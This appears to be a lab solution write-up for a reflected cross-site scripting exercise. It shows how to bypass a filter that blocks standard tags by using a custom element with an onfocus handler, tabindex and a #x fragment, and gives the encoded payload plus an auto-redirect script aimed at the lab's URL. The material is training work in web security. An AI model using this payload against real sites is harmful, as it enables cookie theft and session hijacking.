@@ -1,0 +1,56 @@
+// Lab: Reflected XSS into HTML context with all tags blocked except custom ones
+
+Normal tags like <img>, <svg>, <script> are blocked
+Custom tags are allowed
+Your input is reflected directly into HTML
+
+
+
+// Solution
+
+// Now I inject 
+
+Inject a custom element: <xss>
+
+Attach an event handler (onfocus)
+
+Force browser focus using #x
+
+Auto-trigger alert(document.cookie)
+
+
+The encoded search parameter
+
+Inside URL:
+%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E
+
+
+Decoded URL:
+<xss id=x onfocus=alert(document.cookie) tabindex=1>
+
+
+Why this works:
+<xss>
+
+Custom tag → browser accepts it.
+
+id=x
+
+Gives element an anchor target.
+
+onfocus=alert(document.cookie)
+
+When element gains focus → XSS fires.
+
+tabindex=1
+
+Makes element focusable.
+
+Without this, onfocus never fires.
+
+
+
+Final payload
+<script>
+location = 'https://0a2800be033bae98809ab3be00750062.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
